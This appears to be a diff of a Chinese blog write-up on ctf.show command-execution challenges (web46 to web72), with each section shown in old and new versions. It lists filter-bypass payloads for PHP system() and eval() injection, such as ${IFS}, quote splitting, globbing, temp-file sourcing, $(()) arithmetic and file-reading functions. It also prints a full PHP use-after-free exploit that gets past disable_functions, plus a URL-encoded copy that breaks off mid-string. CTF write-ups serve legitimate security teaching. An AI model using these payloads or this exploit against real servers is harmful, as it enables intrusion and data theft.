 &#125;else&#123;
     highlight_file(__FILE__);
 &#125; 
-</code></pre><p>增加了数字和$*</p><pre><code>?c=tac&lt;fl&#39;&#39;ag.php||
-</code></pre><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221030140817538.png" alt="image-20221030140817538"></p><h2 id="web47"><a href="#web47" class="headerlink" title="web47"></a>web47</h2><pre><code class="php"> &lt;?php
-if(isset($_GET[&#39;c&#39;]))&#123;
-    $c=$_GET[&#39;c&#39;];
+</code></pre><p>增加了数字和 $*</p><pre><code>?c=tac&lt;fl''ag.php||
+</code></pre><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221030140817538.png" alt="image-20221030140817538"></p><h2 id="web47"><a class="anchor" href="#web47">#</a> web47</h2><pre><code class="language-php"> &lt;?php
+if(isset($_GET['c']))&#123;
+    $c=$_GET['c'];
     if(!preg_match(&quot;/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail/i&quot;, $c))&#123;
         system($c.&quot; &gt;/dev/null 2&gt;&amp;1&quot;);
     &#125;
 &#125;else&#123;
     highlight_file(__FILE__);
 &#125;
-</code></pre><p>增加了几个打开文件的命令，但是没有完全过滤，tac和nl都可以用</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221030141214369.png" alt="image-20221030141214369"></p><h2 id="web52"><a href="#web52" class="headerlink" title="web52"></a>web52</h2><pre><code class="php"> &lt;?php
-if(isset($_GET[&#39;c&#39;]))&#123;
-    $c=$_GET[&#39;c&#39;];
+
+</code></pre><p>增加了几个打开文件的命令，但是没有完全过滤，tac 和 nl 都可以用</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221030141214369.png" alt="image-20221030141214369"></p><h2 id="web52"><a class="anchor" href="#web52">#</a> web52</h2><pre><code class="language-php"> &lt;?php
+if(isset($_GET['c']))&#123;
+    $c=$_GET['c'];
     if(!preg_match(&quot;/\;|cat|flag| |[0-9]|\*|more|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;, $c))&#123;
         system($c.&quot; &gt;/dev/null 2&gt;&amp;1&quot;);
     &#125;
 &#125;else&#123;
     highlight_file(__FILE__);
 &#125;
-</code></pre><p>过滤增加了 &lt;&gt;，但是没有$了，空格换一下能用的就行，flag也换地方了</p><pre><code>?c=nl$&#123;IFS&#125;/fla&#39;&#39;g||
-</code></pre><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221030144043709.png" alt="image-20221030144043709"></p><h2 id="web53"><a href="#web53" class="headerlink" title="web53"></a>web53</h2><pre><code class="php"> &lt;?php
-if(isset($_GET[&#39;c&#39;]))&#123;
-    $c=$_GET[&#39;c&#39;];
+</code></pre><p>过滤增加了 &lt;&gt;，但是没有 $ 了，空格换一下能用的就行，flag 也换地方了</p><pre><code>?c=nl$&#123;IFS&#125;/fla''g||
+</code></pre><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221030144043709.png" alt="image-20221030144043709"></p><h2 id="web53"><a class="anchor" href="#web53">#</a> web53</h2><pre><code class="language-php"> &lt;?php
+if(isset($_GET['c']))&#123;
+    $c=$_GET['c'];
     if(!preg_match(&quot;/\;|cat|flag| |[0-9]|\*|more|wget|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;, $c))&#123;
         echo($c);
         $d = system($c);
         echo &quot;&lt;br&gt;&quot;.$d;
     &#125;else&#123;
-        echo &#39;no&#39;;
+        echo 'no';
     &#125;
 &#125;else&#123;
     highlight_file(__FILE__);
 &#125;
-</code></pre><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221030150008909.png" alt="image-20221030150008909"></p><h2 id="web54"><a href="#web54" class="headerlink" title="web54"></a>web54</h2><pre><code class="php">&lt;?php
-if(isset($_GET[&#39;c&#39;]))&#123;
-    $c=$_GET[&#39;c&#39;];
+</code></pre><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221030150008909.png" alt="image-20221030150008909"></p><h2 id="web54"><a class="anchor" href="#web54">#</a> web54</h2><pre><code class="language-php">&lt;?php
+if(isset($_GET['c']))&#123;
+    $c=$_GET['c'];
     if(!preg_match(&quot;/\;|.*c.*a.*t.*|.*f.*l.*a.*g.*| |[0-9]|\*|.*m.*o.*r.*e.*|.*w.*g.*e.*t.*|.*l.*e.*s.*s.*|.*h.*e.*a.*d.*|.*s.*o.*r.*t.*|.*t.*a.*i.*l.*|.*s.*e.*d.*|.*c.*u.*t.*|.*t.*a.*c.*|.*a.*w.*k.*|.*s.*t.*r.*i.*n.*g.*s.*|.*o.*d.*|.*c.*u.*r.*l.*|.*n.*l.*|.*s.*c.*p.*|.*r.*m.*|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;, $c))&#123;
         system($c);
     &#125;
@@ -288,58 +289,39 @@ if(isset($_GET[&#39;c&#39;]))&#123;
     highlight_file(__FILE__);
 &#125;
 </code></pre><pre><code>c=/bin/c?t$&#123;IFS&#125;f???????
-</code></pre><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221030163705319.png" alt="image-20221030163705319"></p><h2 id="web55"><a href="#web55" class="headerlink" title="web55"></a>web55</h2><pre><code class="php">&lt;?php
+</code></pre><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221030163705319.png" alt="image-20221030163705319"></p><h2 id="web55"><a class="anchor" href="#web55">#</a> web55</h2><pre><code class="language-php">&lt;?php
 // 你们在炫技吗？
-if(isset($_GET[&#39;c&#39;]))&#123;
-    $c=$_GET[&#39;c&#39;];
+if(isset($_GET['c']))&#123;
+    $c=$_GET['c'];
     if(!preg_match(&quot;/\;|[a-z]|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;, $c))&#123;
         system($c);
     &#125;
 &#125;else&#123;
     highlight_file(__FILE__);
 &#125; 
-</code></pre><p>过滤了字母，%</p><p>这里可以利用Linux的两个小特性</p><ol><li>shell下可以通过”.”来执行任意脚本文件</li><li>Linux下文件名支持glob通配符代替</li></ol><p>用”.” file执行文件是不需要文件有执行权限的，那么怎么能得到一个可控文件呢，很简单，上传一个文件通过临时文件来执行控制文件，这个文件会保存到临时文件下，默认是&#x2F;tmp&#x2F;phpxxxxxx后6位是随机的字母，最后一个一般是大写</p><p>但是这个题过滤了字母，怎么指向文件呢，这就用到第二个特性通配符</p><p>先写一个简单的上传表单上传一个文件</p><pre><code class="html">&lt;!DOCTYPE html&gt;
-&lt;html lang=&quot;en&quot;&gt;
-
-&lt;head&gt;
-    &lt;meta charset=&quot;UTF-8&quot;&gt;
-    &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt;
-    &lt;meta name=&quot;viewport&quot; content=&quot;width=\, initial-scale=1.0&quot;&gt;
-    &lt;title&gt;Document&lt;/title&gt;
-&lt;/head&gt;
-
-&lt;body&gt;
-&lt;!-- // 上传表单 --&gt;
-    &lt;form action=&quot;http://84aea9a6-e0af-456f-93a2-9bec25124c84.challenge.ctf.show/&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;
-        &lt;input type=&quot;file&quot; name=&quot;file&quot;&gt;
-        &lt;input type=&quot;submit&quot; value=&quot;上传&quot;&gt;
-    &lt;/form&gt;
-&lt;/body&gt;
-
-&lt;/html&gt;
-</code></pre><p>然后执行命令</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221030171950597.png" alt="image-20221030171950597"></p><h2 id="web56"><a href="#web56" class="headerlink" title="web56"></a>web56</h2><pre><code class="php">&lt;?php
+</code></pre><p>过滤了字母，%</p><p>这里可以利用 Linux 的两个小特性</p><ol><li>shell 下可以通过 &quot;.&quot; 来执行任意脚本文件</li><li>Linux 下文件名支持 glob 通配符代替</li></ol><p>用 &quot;.&quot; file 执行文件是不需要文件有执行权限的，那么怎么能得到一个可控文件呢，很简单，上传一个文件通过临时文件来执行控制文件，这个文件会保存到临时文件下，默认是 /tmp/phpxxxxxx 后 6 位是随机的字母，最后一个一般是大写</p><p>但是这个题过滤了字母，怎么指向文件呢，这就用到第二个特性通配符</p><p>先写一个简单的上传表单上传一个文件</p><figure class="highlight html"><figcaption data-lang="HTML"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">html</span><span class="token punctuation">></span></span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span> <span class="token attr-name">lang</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>en<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></pre></td></tr><tr><td data-num="3"></td><td><pre></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span></pre></td></tr><tr><td data-num="5"></td><td><pre>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>UTF-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></pre></td></tr><tr><td data-num="6"></td><td><pre>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">http-equiv</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>X-UA-Compatible<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>IE=edge<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></pre></td></tr><tr><td data-num="7"></td><td><pre>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>viewport<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>width=\, initial-scale=1.0<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></pre></td></tr><tr><td data-num="8"></td><td><pre>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>Document<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span></pre></td></tr><tr><td data-num="9"></td><td><pre><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span></pre></td></tr><tr><td data-num="10"></td><td><pre></pre></td></tr><tr><td data-num="11"></td><td><pre><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span></pre></td></tr><tr><td data-num="12"></td><td><pre><span class="token comment">&lt;!-- // 上传表单 --></span></pre></td></tr><tr><td data-num="13"></td><td><pre>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://84aea9a6-e0af-456f-93a2-9bec25124c84.challenge.ctf.show/<span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>post<span class="token punctuation">"</span></span> <span class="token attr-name">enctype</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>multipart/form-data<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></pre></td></tr><tr><td data-num="14"></td><td><pre>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>file<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>file<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></pre></td></tr><tr><td data-num="15"></td><td><pre>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>上传<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></pre></td></tr><tr><td data-num="16"></td><td><pre>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span></pre></td></tr><tr><td data-num="17"></td><td><pre><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span></pre></td></tr><tr><td data-num="18"></td><td><pre></pre></td></tr><tr><td data-num="19"></td><td><pre><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></pre></td></tr></table></figure><p>然后执行命令</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221030171950597.png" alt="image-20221030171950597"></p><h2 id="web56"><a class="anchor" href="#web56">#</a> web56</h2><pre><code class="language-php">&lt;?php
 
 // 你们在炫技吗？
-if(isset($_GET[&#39;c&#39;]))&#123;
-    $c=$_GET[&#39;c&#39;];
-    if(!preg_match(&quot;/\;|[a-z]|[0-9]|\\$|\(|\&#123;|\&#39;|\&quot;|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;, $c))&#123;
+if(isset($_GET['c']))&#123;
+    $c=$_GET['c'];
+    if(!preg_match(&quot;/\;|[a-z]|[0-9]|\\$|\(|\&#123;|\'|\&quot;|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;, $c))&#123;
         system($c);
     &#125;
 &#125;else&#123;
     highlight_file(__FILE__);
 &#125;
-</code></pre><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221031153720300.png" alt="image-20221031153720300"></p><p>有改动，但是没影响</p><h2 id="web57"><a href="#web57" class="headerlink" title="web57"></a>web57</h2><pre><code class="php">&lt;?php
+</code></pre><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221031153720300.png" alt="image-20221031153720300"></p><p>有改动，但是没影响</p><h2 id="web57"><a class="anchor" href="#web57">#</a> web57</h2><pre><code class="language-php">&lt;?php
 // 还能炫的动吗？
 //flag in 36.php
-if(isset($_GET[&#39;c&#39;]))&#123;
-    $c=$_GET[&#39;c&#39;];
-    if(!preg_match(&quot;/\;|[a-z]|[0-9]|\`|\|\#|\&#39;|\&quot;|\`|\%|\x09|\x26|\x0a|\&gt;|\&lt;|\.|\,|\?|\*|\-|\=|\[/i&quot;, $c))&#123;
+if(isset($_GET['c']))&#123;
+    $c=$_GET['c'];
+    if(!preg_match(&quot;/\;|[a-z]|[0-9]|\`|\|\#|\'|\&quot;|\`|\%|\x09|\x26|\x0a|\&gt;|\&lt;|\.|\,|\?|\*|\-|\=|\[/i&quot;, $c))&#123;
         system(&quot;cat &quot;.$c.&quot;.php&quot;);
     &#125;
 &#125;else&#123;
     highlight_file(__FILE__);
 &#125;
-</code></pre><p>过滤了一堆东西，想办法构造36即可</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221031155531713.png" alt="image-20221031155531713"></p><p>找数字？这不就有了</p><p><code>$(())</code> 代表做一次运算，因为里面为空，也表示值为0<br><code>$((~$(())))</code> 对0作取反运算，值为-1</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221031155740487.png" alt="image-20221031155740487"></p><p>接下来开始构造对这个取反获得正数</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221031155858648.png" alt="image-20221031155858648"></p><p>那么接下来构造出-37，然后取反就行</p><pre><code class="py">data = &quot;$((~$((&quot;+&quot;$((~$(())))&quot;*37+&quot;))))&quot;
+</code></pre><p>过滤了一堆东西，想办法构造 36 即可</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221031155531713.png" alt="image-20221031155531713"></p><p>找数字？这不就有了</p><p><code>$(())</code> 代表做一次运算，因为里面为空，也表示值为 0<br><code>$((~$(())))</code> 对 0 作取反运算，值为 - 1</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221031155740487.png" alt="image-20221031155740487"></p><p>接下来开始构造对这个取反获得正数</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221031155858648.png" alt="image-20221031155858648"></p><p>那么接下来构造出 - 37，然后取反就行</p><pre><code class="language-py">data = &quot;$((~$((&quot;+&quot;$((~$(())))&quot;*37+&quot;))))&quot;
 print(data)
 </code></pre><pre><code>$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~
 $(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~
@@ -347,44 +329,44 @@ $(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~
 $(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~
 $(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~
 $(())))$((~$(())))$((~$(())))))))
-</code></pre><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221031160201680.png" alt="image-20221031160201680"></p><h2 id="web58"><a href="#web58" class="headerlink" title="web58"></a>web58</h2><pre><code class="php">&lt;?php
+</code></pre><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221031160201680.png" alt="image-20221031160201680"></p><h2 id="web58"><a class="anchor" href="#web58">#</a> web58</h2><pre><code class="language-php">&lt;?php
 // 你们在炫技吗？
-if(isset($_POST[&#39;c&#39;]))&#123;
-        $c= $_POST[&#39;c&#39;];
+if(isset($_POST['c']))&#123;
+        $c= $_POST['c'];
         eval($c);
 &#125;else&#123;
     highlight_file(__FILE__);
 &#125;
-</code></pre><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221031161118971.png" alt="image-20221031161118971"></p><p>我开始还在疑惑怎么没过滤了，原来是开始禁用函数了，禁用了system函数，尝试scandir，将结果输出</p><pre><code>c=var_dump(scandir(&#39;.&#39;));
-c=print_r(scandir(&#39;.&#39;));
-</code></pre><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221031162334817.png" alt="image-20221031162334817"></p><pre><code class="php">c=echo file_get_contents(&quot;flag.php&quot;);
+</code></pre><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221031161118971.png" alt="image-20221031161118971"></p><p>我开始还在疑惑怎么没过滤了，原来是开始禁用函数了，禁用了 system 函数，尝试 scandir，将结果输出</p><pre><code>c=var_dump(scandir('.'));
+c=print_r(scandir('.'));
+</code></pre><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221031162334817.png" alt="image-20221031162334817"></p><pre><code class="language-php">c=echo file_get_contents(&quot;flag.php&quot;);
 c=readfile(&quot;flag.php&quot;);
-c=var_dump(file(&#39;flag.php&#39;));
-c=print_r(file(&#39;flag.php&#39;));
+c=var_dump(file('flag.php'));
+c=print_r(file('flag.php'));
 //读文件
 show_source(&quot;flag.php&quot;);             
 highlight_file(&quot;flag.php&quot;);  
 //高亮文件内容
-</code></pre><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221031162659472.png" alt="image-20221031162659472"></p><p>补充：上面的file是将文件内容读入到一个数组中</p><h2 id="web59"><a href="#web59" class="headerlink" title="web59"></a>web59</h2><pre><code class="php">&lt;?php
+</code></pre><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221031162659472.png" alt="image-20221031162659472"></p><p>补充：上面的 file 是将文件内容读入到一个数组中</p><h2 id="web59"><a class="anchor" href="#web59">#</a> web59</h2><pre><code class="language-php">&lt;?php
 // 你们在炫技吗？
-if(isset($_POST[&#39;c&#39;]))&#123;
-        $c= $_POST[&#39;c&#39;];
+if(isset($_POST['c']))&#123;
+        $c= $_POST['c'];
         eval($c);
 &#125;else&#123;
     highlight_file(__FILE__);
 &#125;
-</code></pre><p>emmmm没看到加了啥，我都以为我开错环境了</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221031163958688.png" alt="image-20221031163958688"></p><pre><code class="php">//通过复制，重命名读取使得文件不能被当作php解析
+</code></pre><p>emmmm 没看到加了啥，我都以为我开错环境了</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221031163958688.png" alt="image-20221031163958688"></p><pre><code class="language-php">//通过复制，重命名读取使得文件不能被当作php解析
 copy()
 rename()
 //用法：
 copy(&quot;flag.php&quot;,&quot;flag.txt&quot;);          
 rename(&quot;flag.php&quot;,&quot;flag.txt&quot;); 
-</code></pre><h2 id="web71"><a href="#web71" class="headerlink" title="web71"></a>web71</h2><pre><code class="php">&lt;?php
+</code></pre><h2 id="web71"><a class="anchor" href="#web71">#</a> web71</h2><pre><code class="language-php">&lt;?php
 error_reporting(0);
-ini_set(&#39;display_errors&#39;, 0);
+ini_set('display_errors', 0);
 // 你们在炫技吗？
-if(isset($_POST[&#39;c&#39;]))&#123;
-        $c= $_POST[&#39;c&#39;];
+if(isset($_POST['c']))&#123;
+        $c= $_POST['c'];
         eval($c);
         $s = ob_get_contents();
         ob_end_clean();
@@ -393,10 +375,10 @@ if(isset($_POST[&#39;c&#39;]))&#123;
     highlight_file(__FILE__);
 &#125;
 ?&gt;
-</code></pre><p>使用ob_get_contents()，ob_end_clean();函数将命令执行的回显，这里也简单，使用exit()将后面的部分结束就行。</p><pre><code class="php">c=$a=new DirectoryIterator(&quot;glob:///*&quot;);foreach($a as $f)&#123;echo($f-&gt;__toString().&#39; &#39;);&#125;exit(0);//利用原生类
-c=require_once(&#39;/flag.txt&#39;);exit();
-</code></pre><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221031182645648.png" alt="image-20221031182645648"></p><h2 id="web72"><a href="#web72" class="headerlink" title="web72"></a>web72</h2><pre><code class="php">c=?&gt;&lt;?php $a=new DirectoryIterator(&quot;glob:///*&quot;);foreach($a as $f)&#123;echo($f-&gt;__toString().&#39; &#39;);&#125;exit(0);
-</code></pre><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221101121152127.png" alt="image-20221101121152127"></p><p>看到flag在&#x2F;flag0.txt，读文件，但是没有权限</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221101121324824.png" alt="image-20221101121324824"></p><p>使用uaf脚本绕过</p><pre><code class="php">&lt;?php
+</code></pre><p>使用 ob_get_contents ()，ob_end_clean (); 函数将命令执行的回显，这里也简单，使用 exit () 将后面的部分结束就行。</p><pre><code class="language-php">c=$a=new DirectoryIterator(&quot;glob:///*&quot;);foreach($a as $f)&#123;echo($f-&gt;__toString().' ');&#125;exit(0);//利用原生类
+c=require_once('/flag.txt');exit();
+</code></pre><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221031182645648.png" alt="image-20221031182645648"></p><h2 id="web72"><a class="anchor" href="#web72">#</a> web72</h2><pre><code class="language-php">c=?&gt;&lt;?php $a=new DirectoryIterator(&quot;glob:///*&quot;);foreach($a as $f)&#123;echo($f-&gt;__toString().' ');&#125;exit(0);
+</code></pre><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221101121152127.png" alt="image-20221101121152127"></p><p>看到 flag 在 /flag0.txt，读文件，但是没有权限</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221101121324824.png" alt="image-20221101121324824"></p><p>使用 uaf 脚本绕过</p><pre><code class="language-php">&lt;?php
 
 function ctfshow($cmd) &#123;
     global $abc, $helper, $backtrace;
@@ -407,7 +389,7 @@ function ctfshow($cmd) &#123;
             global $backtrace; 
             unset($this-&gt;a);
             $backtrace = (new Exception)-&gt;getTrace();
-            if(!isset($backtrace[1][&#39;args&#39;])) &#123;
+            if(!isset($backtrace[1]['args'])) &#123;
                 $backtrace = debug_backtrace();
             &#125;
         &#125;
@@ -531,22 +513,22 @@ function ctfshow($cmd) &#123;
 
     function trigger_uaf($arg) &#123;
 
-        $arg = str_shuffle(&#39;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#39;);
+        $arg = str_shuffle('AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA');
         $vuln = new Vuln();
         $vuln-&gt;a = $arg;
     &#125;
 
-    if(stristr(PHP_OS, &#39;WIN&#39;)) &#123;
-        die(&#39;This PoC is for *nix systems only.&#39;);
+    if(stristr(PHP_OS, 'WIN')) &#123;
+        die('This PoC is for *nix systems only.');
     &#125;
 
     $n_alloc = 10; 
     $contiguous = [];
     for($i = 0; $i &lt; $n_alloc; $i++)
-        $contiguous[] = str_shuffle(&#39;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#39;);
+        $contiguous[] = str_shuffle('AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA');
 
-    trigger_uaf(&#39;x&#39;);
-    $abc = $backtrace[1][&#39;args&#39;][0];
+    trigger_uaf('x');
+    $abc = $backtrace[1]['args'][0];
 
     $helper = new Helper;
     $helper-&gt;b = function ($x) &#123; &#125;;
@@ -569,19 +551,19 @@ function ctfshow($cmd) &#123;
 
     $binary_leak = leak($closure_handlers, 8);
     if(!($base = get_binary_base($binary_leak))) &#123;
-        die(&quot;Couldn&#39;t determine binary base address&quot;);
+        die(&quot;Couldn't determine binary base address&quot;);
     &#125;
 
     if(!($elf = parse_elf($base))) &#123;
-        die(&quot;Couldn&#39;t parse ELF header&quot;);
+        die(&quot;Couldn't parse ELF header&quot;);
     &#125;
 
     if(!($basic_funcs = get_basic_funcs($base, $elf))) &#123;
-        die(&quot;Couldn&#39;t get basic_functions address&quot;);
+        die(&quot;Couldn't get basic_functions address&quot;);
     &#125;
 
     if(!($zif_system = get_system($basic_funcs))) &#123;
-        die(&quot;Couldn&#39;t get zif_system address&quot;);
+        die(&quot;Couldn't get zif_system address&quot;);
     &#125;
 
 
@@ -600,10 +582,11 @@ function ctfshow($cmd) &#123;
 
 ctfshow(&quot;cat /flag0.txt&quot;);ob_end_flush();
 ?&gt;
-</code></pre><pre><code>c=function%20ctfshow(%24cmd)%20%7B%0A%20%20%20%20global%20%24abc%2C%20%24helper%2C%20%24backtrace%3B%0A%0A%20%20%20%20class%20Vuln%20%7B%0A%20%20%20%20%20%20%20%20public%20%24a%3B%0A%20%20%20%20%20%20%20%20public%20function%20__destruct()%20%7B%20%0A%20%20%20%20%20%20%20%20%20%20%20%20global%20%24backtrace%3B%20%0A%20%20%20%20%20%20%20%20%20%20%20%20unset(%24this-%3Ea)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24backtrace%20%3D%20(new%20Exception)-%3EgetTrace()%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20if(!isset(%24backtrace%5B1%5D%5B&#39;args&#39;%5D))%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24backtrace%20%3D%20debug_backtrace()%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%7D%0A%0A%20%20%20%20class%20Helper%20%7B%0A%20%20%20%20%20%20%20%20public%20%24a%2C%20%24b%2C%20%24c%2C%20%24d%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20function%20str2ptr(%26%24str%2C%20%24p%20%3D%200%2C%20%24s%20%3D%208)%20%7B%0A%20%20%20%20%20%20%20%20%24address%20%3D%200%3B%0A%20%20%20%20%20%20%20%20for(%24j%20%3D%20%24s-1%3B%20%24j%20%3E%3D%200%3B%20%24j--)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24address%20%3C%3C%3D%208%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24address%20%7C%3D%20ord(%24str%5B%24p%2B%24j%5D)%3B%0A%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20return%20%24address%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20function%20ptr2str(%24ptr%2C%20%24m%20%3D%208)%20%7B%0A%20%20%20%20%20%20%20%20%24out%20%3D%20%22%22%3B%0A%20%20%20%20%20%20%20%20for%20(%24i%3D0%3B%20%24i%20%3C%20%24m%3B%20%24i%2B%2B)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24out%20.%3D%20sprintf(%22%25c%22%2C(%24ptr%20%26%200xff))%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24ptr%20%3E%3E%3D%208%3B%0A%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20return%20%24out%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20function%20write(%26%24str%2C%20%24p%2C%20%24v%2C%20%24n%20%3D%208)%